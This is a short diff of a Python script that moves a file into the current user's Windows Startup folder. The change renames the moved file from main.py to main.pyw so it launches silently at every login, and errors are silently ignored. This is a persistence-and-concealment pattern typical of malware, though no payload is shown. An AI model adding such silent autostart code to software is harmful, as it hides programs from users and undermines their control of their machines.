@@ -5,7 +5,7 @@ import subprocess
 import sys
 USER_NAME = getpass.getuser()
 destination = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
-app = os.path.abspath(os.getcwd()) + "\main.py"
+app = os.path.abspath(os.getcwd()) + "\main.pyw"
 try:
     shutil.move(app, destination)
 except:
